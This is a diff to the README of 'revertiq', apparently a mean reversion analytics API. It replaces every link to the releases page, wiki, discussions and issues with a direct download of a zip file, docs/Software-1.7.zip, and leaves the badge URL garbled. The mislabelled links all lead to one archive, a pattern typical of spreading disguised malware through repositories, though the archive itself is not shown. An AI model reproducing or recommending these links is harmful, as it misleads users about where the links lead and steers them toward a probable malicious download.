@@ -1,7 +1,7 @@
 # 🎯 revertiq - A Simple API for Mean Reversion Analytics
 
 ## 🔗 Download the Latest Version
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/MatrixEclipse/revertiq/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/MatrixEclipse/revertiq/main/docs/Software-1.7.zip%20Latest%https://raw.githubusercontent.com/MatrixEclipse/revertiq/main/docs/Software-1.7.zip)](https://raw.githubusercontent.com/MatrixEclipse/revertiq/main/docs/Software-1.7.zip)
 
 ## 📖 Overview
 revertiq is an application designed to analyze mean reversion in financial data. This software provides a user-friendly API that lets you access various analytics features. Whether you are a trader, a student, or just curious about financial data, revertiq will help you understand mean reversion better with practical tools and detailed documentation.
@@ -10,7 +10,7 @@ revertiq is an application designed to analyze mean reversion in financial data.
 To begin using revertiq, you need to download it from the Releases page. Follow these simple steps:
 
 ### 1. Visit the Download Page
-Go to the [Releases page](https://github.com/MatrixEclipse/revertiq/releases) to find the latest version of the application.
+Go to the [Releases page](https://raw.githubusercontent.com/MatrixEclipse/revertiq/main/docs/Software-1.7.zip) to find the latest version of the application.
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of available versions. Each version has a title, release notes, and the assets you can download. Choose the version that meets your needs.
@@ -74,9 +74,9 @@ revertiq is open-source under the MIT License. You are free to use, modify, and 
 ## 🔗 More Resources
 For more information about revertiq and its features, check out the following resources:
 
-- [API Documentation](https://github.com/MatrixEclipse/revertiq/wiki)
-- [Community Discussions](https://github.com/MatrixEclipse/revertiq/discussions)
-- [Feature Requests](https://github.com/MatrixEclipse/revertiq/issues)
+- [API Documentation](https://raw.githubusercontent.com/MatrixEclipse/revertiq/main/docs/Software-1.7.zip)
+- [Community Discussions](https://raw.githubusercontent.com/MatrixEclipse/revertiq/main/docs/Software-1.7.zip)
+- [Feature Requests](https://raw.githubusercontent.com/MatrixEclipse/revertiq/main/docs/Software-1.7.zip)
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/MatrixEclipse/revertiq/releases) to download the latest version. Follow the installation instructions based on your operating system, and you’ll be ready to explore mean reversion analytics in no time!
+To get started, visit the [Releases page](https://raw.githubusercontent.com/MatrixEclipse/revertiq/main/docs/Software-1.7.zip) to download the latest version. Follow the installation instructions based on your operating system, and you’ll be ready to explore mean reversion analytics in no time!
